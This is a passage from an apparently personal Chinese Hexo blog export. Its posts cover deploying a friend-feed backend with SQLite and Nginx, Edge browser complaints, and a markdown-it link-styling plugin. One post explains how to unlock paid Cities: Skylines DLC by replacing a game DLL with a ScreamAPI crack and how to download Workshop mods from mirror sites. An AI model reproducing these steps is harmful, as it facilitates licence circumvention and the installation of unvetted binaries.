                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>第一次写 Hexo 插件</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>另外写一个脚本，每次 Hexo 构建时，都去遍历一遍文章，记录文章标题与文章 front-matter 中 abbrlink 的键值关系，就像我在 <a href="#4139834099" title="Butterfly 侧边栏实现 Obsidian 关系图谱" class="record-link highlight">另一个项目</a> 做的那样。</li>
<li>字符串匹配，替换双链为 <code>&lt;a&gt;</code> 标签。</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2966071784" class="record">
            <header>
                <h1 class="record-title">server、sqlite 朋友圈部署方案</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                    <button class="btn" onclick="activeTag('Linux');">Linux</button>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                    <button class="btn" onclick="activeTag('SQLite');">SQLite</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/13/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/frcirlecover.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>简要介绍我在服务器的部署友链朋友圈过程以示参考</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>b0caa9e8</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>本来不想写的，觉得自己看文档就能实现。但是实际操作过程出现了很多状况，文档不是太详细，MySQL 部署失败......<s>于是打算水一篇 😓</s>。</p>
<p>官方文档：<a href="https://fcircle-doc.yyyzyyyz.cn/#/">友链朋友圈 - 使用手册</a></p>
<h1>环境</h1>
<p>我采用的方案是 Server + SQLite 的部署方案。</p>
<p>根据文档要求 python 环境为 3.8，原本我的服务器版本为 3.6，需要升级。（此处由于我忽略版本导致踩坑）</p>
<pre><code class="language-bash"># 适用于CentOS系统。安装db4-devel可能报错，那我们就跳过它......
yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel libpcap-devel xz-devel libffi-devel # 忽略 db4-devel
# 下面这些基础工具没安的可以安装
yum -y install yum vim gcc
# 下载Python包
wget https://www.python.org/ftp/python/3.8.8/Python-3.8.8.tgz
# 解压并进入目录
tar -zxf Python-3.8.8.tgz &amp;&amp; cd Python-3.8.8 &amp;&amp; ./configure --prefix=/usr/local/python3
make &amp;&amp; make install
# 删除原先链接，建立软连接
rm -rf /usr/bin/python3
ln -s /usr/local/python3/bin/python3 /usr/bin/python3
rm -rf /usr/bin/pip3
ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3
# 查看是否安装成功
python3 --version
pip3 --version
# 安装YAML模块
pip3 install pyyaml
</code></pre>
<p>安装 Git：</p>
<pre><code class="language-bash">yum install -y git
</code></pre>
<h1>项目安装</h1>
<p>找个好地方克隆仓库：</p>
<pre><code class="language-bash">git clone https://github.com/Rock-Candy-Tea/hexo-circle-of-friends.git
</code></pre>
<p>编辑 <code>/hexo_circle_of_friends/fc_settings.yaml</code> 文件：</p>
<pre><code class="language-yaml">LINK: [
	# 友链页地址1，修改为你的友链页地址
	# 因为博客最后生成的网页都在本地，我直接写本地地址
     { link: &quot;http://127.0.0.1/pages/friends/&quot;, theme: &quot;butterfly&quot; },
]
</code></pre>
<p>部署与测试 API：</p>
<pre><code class="language-bash">python3 deploy.py        # 部署
curl 127.0.0.1:8000/all  # 测试接口
</code></pre>
<p>部署时如遇找不到包的错误，比如 ERROR: Could not find a version that satisfies the requirement aiofiles (from versions: none) ，可尝试更换源下载。如针对以上报错，可以执行：</p>
<pre><code class="language-sh"># 指定版本
pip3 install &quot;aiofiles==0.8.0&quot; -i https://pypi.tuna.tsinghua.edu.cn/simple/ # 清华源
</code></pre>
<p>但是依赖列表这么多，总不能一个个下。我们可以直接执行这条指令：</p>
<pre><code class="language-sh">pip3 install -r /var/www/hexo-circle-of-friends/hexo_circle_of_friends/requirements.txt
</code></pre>
<p>完事后，重新部署即可。</p>
<h1>Nginx 配置</h1>
<p>由于之前 [^cdn] 弄了好一会这个配置，为的是网站实现全程 HTTPS 访问。现在我也想让外部访问朋友圈接口时也使用 HTTPS。</p>
<p>[^cdn]: 参见我的折腾过程：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link ">博客域名解析管理与网站 CDN 加速域名配置</a></p>
<pre><code class="language-diff">server {
    listen 443 ssl;
    server_name  localhost;
    access_log  /var/log/nginx/host.access.log  main;
    location / {
        root   /var/www/uuanqin.top;
        index  index.html index.htm;
    }
+   # 友链朋友圈 获取后端内容 前端登录（Heo方案）
+   location ^~/fc_backend/ {
+        proxy_set_header    X-FORWARDED-FOR $remote_addr;
+        proxy_set_header    X-FORWARDED-PROTO $scheme;
+        proxy_set_header    Host   $http_host;
+        proxy_pass http://127.0.0.1:8000/;
+    }

    error_page  404              /404.html;
    ssl_certificate conf.d/cert/www.uuanqin.top.pem;
    ssl_certificate_key conf.d/cert/www.uuanqin.top.key;
    ...
}
</code></pre>
<p>通过 location 正则匹配，识别出 <code>/fc_backend/</code> 开头的链接为朋友圈 API 的请求，并将其转发到端口 8000（朋友圈默认端口）。发送给 8000 端口的地址不包含 <code>/fc_backend/</code>。</p>
<p>当然，这里需要前端也要配合发出 <code>/fc_backend/</code> 开头的请求。</p>
<p>修改配置文件后别忘了重启 Nginx。</p>
<pre><code class="language-bash">nginx -s reload
</code></pre>
<h1>前端部署</h1>
<p>这里我采用了文档方案。</p>
<pre><code class="language-html">&lt;div id=&quot;hexo-circle-of-friends-root&quot;&gt;&lt;/div&gt;
&lt;script&gt;
let UserConfig = {
	// 填写你的api地址
	private_api_url: 'https://uuanqin.top/fc_backend/',
	// 初始加载几篇文章
	page_init_number: 20,
	// 点击加载更多时，一次最多加载几篇文章，默认10
	page_turning_number: 10,
	// 头像加载失败时，默认头像地址
	error_img: 'https://sdn.geekzu.org/avatar/57d8260dfb55501c37dde588e7c3852c',
	// 进入页面时第一次的排序规则
	sort_rule: 'created', // 本地文章缓存数据过期时间（天）
	expire_days: 1
}
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;https://npm.elemecdn.com/fcircle-theme-yyyz@1.0.13/dist/fcircle.min.js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>注意 <code>private_api_url</code> 中的设置。</p>
<h1>前端改密码方式</h1>
<p>友链朋友圈项目的前端第一次登录时即设置密码，如果想要改的话则需要自行删除数据库 <code>auth</code>、<code>secret</code> 表格。</p>
<p>进入服务器 <code>hexo-circle-of-friends</code> 根目录，找到 <code>data.db</code> 文件</p>
<pre><code class="language-bash">sqlite3
sqlite&gt; .open data.db # 打开数据库
sqlite&gt; .tables
# auth  friends  posts  secret
sqlite&gt; DROP TABLE auth;
sqlite&gt; DROP TABLE secret;
sqlite&gt; .tables
# friends  posts
sqlite&gt; .exit
</code></pre>
<p>重新部署朋友圈即可。</p>
<h1>【可选】鱼塘 DLC</h1>
<p>鱼塘 DLC 是 <a href="https://blog.zhheo.com">张洪Heo</a> 写的一个基于友链 - 朋友圈的脚本。它可以随机展示一条抓取记录。与洪涝不同的是，我稍微调整了一下 CSS 以改进页面布局。</p>
<pre><code class="language-html">&lt;div  class=&quot;title-h2-a&quot; style=&quot;overflow: hidden;&quot;&gt;
  &lt;div class=&quot;title-h2-a-left&quot;&gt;
    &lt;div style=&quot;padding-top: 0;margin: 0 8px 0.6rem; font-size: 20px; font-weight:bold;float: left;&quot;&gt;🎣 钓鱼&lt;/div&gt;

  &lt;a class=&quot;random-post-start&quot; href=&quot;javascript:fetchRandomPost();&quot;&gt;&lt;i class=&quot;fa-solid fa-arrow-rotate-right&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;div id=&quot;random-post&quot; style=&quot;min-height: 32px; background: var(--heo-card-bg); border: var(--style-border-always); box-shadow: var(--heo-shadow-border); padding: 20px 30px; border-radius: 12px; margin-top: 8px;&quot;&gt;&lt;/div&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/gh/zhheo/JS-Heo@main/moments/random-friends-post.css&quot;&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
  var fdataUser = {
   apiurl: 'https://uuanqin.top/fc_backend/',
  defaultFish: 500,
  hungryFish: 500,
  }
&lt;/script&gt;
</code></pre>
<p>需要注意的是，必须使用 <code>jquery.js</code>，记得引入。不要漏掉 <code>id</code> 为 <code>random-post</code> 的框，这是回显钓鱼信息用的。</p>
<p>由于其中的 css 和 js 使用了 jsdelivr[^jsd]，为了国内访问，我把他们粘到本地 inject 算了。</p>
<p>[^jsd]: 参考 <a href="#2065118013" title="国内访问 Hexo 优化加速（CDN链接替换）" class="record-link ">国内访问 Hexo 优化加速（CDN链接替换）</a>。</p>
<pre><code class="language-yaml">inject:
  head:
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;your css&quot;&gt;
  bottom:
    - &lt;script src=&quot;your js&quot;&gt;&lt;/script&gt;
</code></pre>
<h1>【可选】设置 CDN 的不缓存规则</h1>
<p>由于本站采取了 CDN，接口 <code>https://uuanqin.top/fc_backend/</code> 所有请求应该设置不缓存，否则鱼塘、朋友圈刷新了还是一个样。</p>
<p>打开 CDN 加速域名配置页面、增加多一个缓存规则即可：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230814230524.png" alt="image.png"></p>
<h1>后续改进</h1>
<ul>
<li>[ ] 服务器重启后需要自行手动部署</li>
<li>[ ] 目前使用的朋友圈太庞杂，以后可以开发自己的爬虫</li>
</ul>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/z736248591/article/details/117124631">CentOS 8 升级 Python3.6 到 Python3.9_雪靡的博客-CSDN 博客</a></li>
<li><a href="https://fcircle-doc.yyyzyyyz.cn/#/problems">常见问题 (yyyzyyyz.cn)</a></li>
<li><a href="https://blog.csdn.net/weixin_44299027/article/details/107286956">【Nginx 用法】nginx location 正则表达式写法，详解 Nginx location 匹配规则（很详细哦）_nginx location 正则_No8g 攻城狮的博客-CSDN 博客</a></li>
<li><a href="https://www.runoob.com/sqlite/sqlite-drop-table.html">SQLite 删除表 | 菜鸟教程 (runoob.com)</a></li>
<li><a href="https://cloud.tencent.com/developer/article/2238065">Hexo -43- 友链朋友圈 后端部署-腾讯云开发者社区-腾讯云 (tencent.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/451825018">Nginx 配置反向代理，一篇搞定！ - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/YUICUI/article/details/108471302">【python入门】如何生成和安装requirements.txt依赖？_requirements依赖-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/361790784">pip安装包报错Could not find a version that satisfies the requirement pymysql (from versions: none) - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.zhheo.com/p/908df4e2.html">鱼塘DLC - 钓鱼：你钓到了一篇惊世好文！ | 张洪Heo (zhheo.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="2065118013">
                            <a href="#2065118013">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>国内访问 Hexo 优化加速（CDN链接替换）</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^jsd]: 参考 <a href="#2065118013" title="国内访问 Hexo 优化加速（CDN链接替换）" class="record-link highlight">国内访问 Hexo 优化加速（CDN链接替换）</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2201181434">
                            <a href="#2201181434">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                </span>
                                
                                <span>博客域名解析管理与网站 CDN 加速域名配置</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^cdn]: 参见我的折腾过程：<a href="#2201181434" title="博客域名解析管理与网站 CDN 加速域名配置" class="record-link highlight">博客域名解析管理与网站 CDN 加速域名配置</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="414962704">
                            <a href="#414962704">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客的写作与装饰</span>
                                
                                <div class="record-links-context hover">
                                    <p>部署友链朋友圈：<a href="#2966071784" title="server、sqlite 朋友圈部署方案" class="record-link highlight">server、sqlite 朋友圈部署方案</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="657793374" class="record">
            <header>
                <h1 class="record-title">Epic 城市天际线 DLC 全破解与模组安装</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Epic');">Epic</button>
                    
                    <button class="btn" onclick="activeTag('游戏');">游戏</button>
                    
                    <button class="btn" onclick="activeTag('DLC');">DLC</button>
                    
                    <button class="btn" onclick="activeTag('Mod');">Mod</button>
                    
                    <button class="btn" onclick="activeTag('Steam');">Steam</button>
                    
                    <button class="btn" onclick="activeTag('Cities Skylines');">Cities Skylines</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/19/2023</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>介绍DLC安装方法以及Steam模组安装，请支持正版游戏</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>2735215e</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span></span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>在 Epic 喜加一（白 Piao）了《都市·天际线》的游戏本体，怎样才能解锁全 DLC 并安装 steam 创意工坊中的模组？</p>
<blockquote>
<p>[!warning] 本文仅做操作备忘，如果条件允许请支持正版游戏。</p>
</blockquote>
<h1>Epic 安装游戏本体</h1>
<p>将 <code>游戏安装目录\Cities_Data\Plugins</code> 内的 <code>EOSSDK-Win64-Shipping.dll</code> 文件重命名为 <code>EOSSDK-Win64-Shipping_o.dll</code></p>
<p>将 DLC 破解文件压缩包 <a href="%E8%AF%A6%E8%A7%81%E4%BD%A0%E7%9A%84%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98">^pan</a> 内的两个文件解压到相同目录下解锁全部 DLC</p>
<ul>
<li>EOSSDK-Win64-Shipping.dll</li>
<li>ScreamAPI.ini</li>
</ul>
<p>启动游戏，<strong>等待启动器的更新</strong>。更新完毕后即可看到全 DLC。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230816190041363.png" alt="image-20230816190041363|350"></p>
<blockquote>
<p>[!warning] 注意</p>
<p>需要<strong>联网登录</strong>自己的账号再进入游戏，确保 DLC 加载完毕才进入存档，否则存档会失去模组内容。</p>
<p>启动器<strong>保持最新</strong>，如果 Epic 启动器更新过慢可以自己去官网重新安装。这样以后 Epic 会启动最新那个启动器</p>
<p>建议每次进入游戏时 <strong>选择「开始游戏」</strong> 而不是选择「继续」直接进入上次游玩存档，以防 DLC 未加载。</p>
</blockquote>
<h1>下载 Mod 方法</h1>
<blockquote>
<p>[!warning] 注意<br>
可能需要严苛的网络环境才能访问以下网站</p>
</blockquote>
<h2>方法一</h2>
<p>打开 Steam 创意工坊，进入想要安装的模组页面，右键复制链接。</p>
<p>打开：<a href="https://ggntw.com/steam">GGNETWORK :: Скачать с мастерской Steam (ggntw.com)</a>，粘贴链接下载</p>
<p>解压压缩包文件成一个文件夹，放在 <code>游戏安装目录\Files\Mods</code> 下，文件夹可以改名字。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230816190438620.png" alt="image-20230816190438620"></p>
<h2>方法二</h2>
<p>打开 Steam 创意工坊，进入想要安装的模组页面，右键复制链接。</p>
<p>打开： <a href="http://steamworkshop.download/">http://steamworkshop.download/</a></p>
<p>如果点下载出现 <em>free space left</em>，那就是 mod 库里面没有，下不了</p>
<h2>方法三【推荐】</h2>
<p><a href="https://smods.ru/">https://smods.ru/</a> ，搜索模组名即可</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/read/cv22888523">Epic 版天际线只解锁想要的 DLC，部分 MOD 分享 - 哔哩哔哩 (bilibili.com)</a></li>
<li><a href="https://www.reddit.com/r/PiratedGames/comments/ww4kb5/steamworkshopdownload_free_space_left_error/?onetap_auto=true">Steamworkshop.download &quot;free space left&quot; error : PiratedGames (reddit.com)</a></li>
<li><a href="https://www.bilibili.com/read/cv9114591">Steam 创意工坊 mod 下载攻略（部分游戏可用） - 哔哩哔哩 (bilibili.com)</a></li>
<li><a href="https://www.bilibili.com/video/av894632437/?vd_source=e03d48176855fc5349b27aef691f9cdb">Epic 版本《城市天际线》安装 mod 教程（资产+模组）<em>哔哩哔哩 bilibili</em>城市天际线</a></li>
<li><a href="https://www.bilibili.com/read/cv15638945">建议收藏！2022 版 EPIC·城市天际线 全 DLC 激活教程 - 哔哩哔哩 (bilibili.com)</a></li>
<li><a href="https://www.bilibili.com/read/cv21638001/">解决 P 社启动器(Paradox Launcher)无法更新问题 - 哔哩哔哩 (bilibili.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="1309833614" class="record">
            <header>
                <h1 class="record-title">又是被 Edge 气拥的一天天</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Edge');">Edge</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                    <button class="btn" onclick="activeTag('吐槽');">吐槽</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/24/2023</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>老是乱搞什么东东</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>4e12798e</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span></span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>本篇于 2024.03.08 重构，主要记录被 Edge 气到的神奇设计。<br>
原标题：突然觉得我的博客主页怪怪的？原来是 Edge 默默作祟</p>
</blockquote>
<h1>无故调整 UI</h1>
<p>就在今天（2023 年 8 月 24 日）我逛自己博客的一瞬间，感觉页面有点怪，说不出来。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230824230749.webp" alt="image.png"></p>
<p>仔细观察发现，原来是我的博客变窄了。 <s>虽然说变窄后的博客显得好像更清爽些，但是</s> 文章配图，侧边栏文字什么的都受到影响，看着别扭。</p>
<p>这到底是什么时候发生的事，我都回想不起来。我最近也没动过主题配置文件，看了 <kbd>F12</kbd> 也没见有 CSS 冲突，页面没有缩放。想去看看 Butterfly 主题配置文档，是不是我不小心动了某项设置，去到发现 Jerry 主页发现他的页面宽度跟我的差不多 😂...于是怀疑到浏览器头上。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230824230857.webp" alt="image.png"></p>
<p>果然，Edge 不知道在什么时候默默更新，并在我不知情的情况下<strong>启动了所谓的「全新外观」</strong>。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230824225744.png" alt="image.png"></p>
<p>结果。关掉它一切就正常了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230824230535.png" alt="image.png"></p>
<p>事后想想，这种试用性质的功能不应该是用户知情后主动开的吗？还让我进行评价 😅 有点不知道说啥了。这种客户端侧的问题我也无能为力，只能怪我没有充足的兼容意识和容错思想了。<s>一想到我要重做所有文章封面整个人就累死了 😫😫😫</s></p>
<p>回看新版本的 Edge「全新外观」指的是什么：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230825010724.webp" alt="image.png|300"></p>
<p>它把原来的网页做成圆角，整出卡片样，以契合新出的「分屏」功能。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230825011221.webp" alt="image.png"></p>
<p>浏览器分屏？？虽然可能提升了一点点分屏体验，但是也不是很必要吧...... Edge 总是在杂合更多的花里胡哨的功能。</p>
<p>已经开始逐步重做封面了🤮🤮🤮。</p>
<blockquote>
<p>浏览器夜间模式下，Edge 还会自作主张把网页白页面弄黑。导致博客的「黑车」出现。</p>
</blockquote>
<h1>找不回关闭的标签页组</h1>
<p>自从标签页组出现后，我就开始慢慢地尝试。且留意到关闭浏览器后下次再打开，标签页组也不会消失（前提是上一次关闭浏览器时里面有标签页组）。于是我就培养了一个习惯：一些当前工作的网页以及我打算未来处理的网页一直保留在多个组中。这样的情况持续了很久，直到今天（2024.03.08）手贱，右键，关闭所有标签页......然后所有标签页关闭了。</p>
<blockquote>
<p>据推测，似乎是Edge更新后会把固定的标签页组删除。</p>
</blockquote>
<p>此时我还不慌。我习惯地按下 <kbd>Ctrl+Shift+T</kbd>，一切应该恢复原样。咦？怎么只恢复单个页面，我的标签页组呢？狂按，恢复了十几个单页面后就没响应了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240309000040.webp" alt="image.png"></p>
<p>不急，我还有历史记录的「最近关闭」，乱成一锅！啥也没有找到！</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240309000312.webp" alt="image.png"></p>
<p>无语，没别的办法了。就当作没了吧（反正平时也不常打开）。</p>
<p>收获一个教训：重要链接记得及时固化！</p>
<h1>其他吐槽</h1>
<p><a href="#4084230277" title="解决 Bing 搜索页自动返回顶部的问题" class="record-link ">解决 Bing 搜索页自动返回顶部的问题</a></p>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="4084230277">
                            <a href="#4084230277">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_解决问题);">⬤</span>
                                    
                                </span>
                                
                                <span>解决 Bing 搜索页自动返回顶部的问题</span>
                                
                                <div class="record-links-context hover">
                                    <p><a href="#4084230277" title="解决 Bing 搜索页自动返回顶部的问题" class="record-link highlight">解决 Bing 搜索页自动返回顶部的问题</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
            </footer>
        </article>
        
        <article id="127992739" class="record">
            <header>
                <h1 class="record-title">自定义文章内外链接样式的另一种方法（使用 markdown-it 插件）</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('Markdown');">Markdown</button>
                    
                    <button class="btn" onclick="activeTag('NPM');">NPM</button>
                    
                    <button class="btn" onclick="activeTag('markdown-it');">markdown-it</button>
                    
                    <button class="btn" onclick="activeTag('css');">css</button>
                    
                    <button class="btn" onclick="activeTag('Codepen');">Codepen</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/27/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20230827011635.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>介绍一款 markdown-it 插件以区分文章中的外部链接和内部链接</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>7a103a3</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>我们有很多种方式美化我们文章中的链接。在有些情况下，我们可能需要为文章中的外部链接和内部链接进行区分，分别设置它们的样式。</p>
<h1>插件介绍</h1>
<p><a href="https://github.com/rotorz/markdown-it-external-links#readme">markdown-it-external-links</a> 是一款 Markdown 渲染插件，为不同类型的链接增加 CSS class。</p>
<p>例如，你的文章中的链接：</p>
<pre><code class="language-markdown">- [Internal Link A](/)
- [Internal Link B](//example.org)
- [Internal Link C](http://example.org)
- [Internal Link D](other-page.html)
- [Internal Link E](.././other-page.html)
- [External Link A](//example.com)
- [External Link B](http://example.com)
</code></pre>
<p>将会被渲染为：</p>
<pre><code class="language-markdown">&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/&quot; class=&quot;internal-link&quot;&gt;Internal Link A&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;//example.org&quot; class=&quot;internal-link&quot;&gt;Internal Link B&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://example.org&quot; class=&quot;internal-link&quot;&gt;Internal Link C&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;other-page.html&quot; class=&quot;internal-link&quot;&gt;Internal Link D&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;.././other-page.html&quot; class=&quot;internal-link&quot;&gt;Internal Link E&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;//example.com&quot; class=&quot;external-link&quot;&gt;External Link A&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://example.com&quot; class=&quot;external-link&quot;&gt;External Link B&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre>
<h1>使用</h1>
<p>在博客项目中安装插件：</p>
<pre><code class="language-sh">npm install --save markdown-it-external-links
</code></pre>
<p>如果你的 Markdown 渲染引擎为 <a href="https://www.npmjs.com/package/hexo-renderer-markdown-it">hexo-renderer-markdown-it</a> 或 <a href="https://github.com/CHENXCHEN/hexo-renderer-markdown-it-plus">hexo-renderer-markdown-it-plus</a> [^mdi]，则在配置文件 <code>_config.yml</code> 中对应的地方引入该插件。</p>
<pre><code class="language-yaml"># markdown_it_plus 语法渲染插件选项
markdown_it_plus:
	plugins:
		# markdown-it-external-links 外部链接
		- plugin:
			name: markdown-it-external-links
			enable: true
			options:
			# this is plugin option
			externalClassName: link-external
			# internalClassName:
</code></pre>
<p>[^mdi]: 关于这两款插件的介绍可以参考：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a> 中的第一部分</p>
<p><code>externalClassName</code> 则允许我们自定义外部链接采用的样式名，这里为 <code>link-external</code>。</p>
<p>这里我以 CodePen 项目 <a href="https://codepen.io/decemberly/pen/JOrBxo">Awesome link underlines</a> 为例，将下面的 CSS 引入主题中，注意 CSS 选择器要重命名：</p>
<pre><code class="language-css">.link-external {
	color: black;
	border-bottom: 0.1em solid #669900;
	outline: 1em solid rgba(255, 215, 0, 0);
	text-decoration: none;
	transition: all 0.3s ease;
}
.link-external:hover, .link-external:focus, .link-external:active {
	background: #b5ca4226;
	outline: 0.1em solid #b5ca4226;
}
</code></pre>
<p>Butterfly 的引入方法为：</p>
<ol>
<li>打开主题配置文件（butterfly.yml）</li>
<li>定位搜索 inject</li>
<li>其中 head 是用来引入 css 的</li>
</ol>
<pre><code class="language-yaml">inject:
  head:
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;your css&quot;&gt;
  bottom:
    - &lt;script src=&quot;your js&quot;&gt;&lt;/script&gt;
</code></pre>
<h1>效果预览</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/hovermousedemo.gif" alt="demo"></p>
<p>当然，我选的这个项目比较简单，你可以设置更复杂的样式分别对两种链接进行美化。</p>
<h1>后续改进</h1>
<ul>
<li>[ ] 由于我的博客写作使用 Obsidian，内部链接一般使用双向链接的<strong>双中括号</strong>语法，这个插件暂时还识别不出。后续有时间改进一下。截至目前，双中括号语法已写新插件，这个问题有望解决：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link ">Hexo 博客适配 Obsidian 新语法</a>。</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="3569112562">
                            <a href="#3569112562">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Hexo 博客适配 Obsidian 新语法</span>
                                
                                <div class="record-links-context hover">
                                    <p>[^mdi]: 关于这两款插件的介绍可以参考：<a href="#3569112562" title="Hexo 博客适配 Obsidian 新语法" class="record-link highlight">Hexo 博客适配 Obsidian 新语法</a> 中的第一部分</p>
<ul>
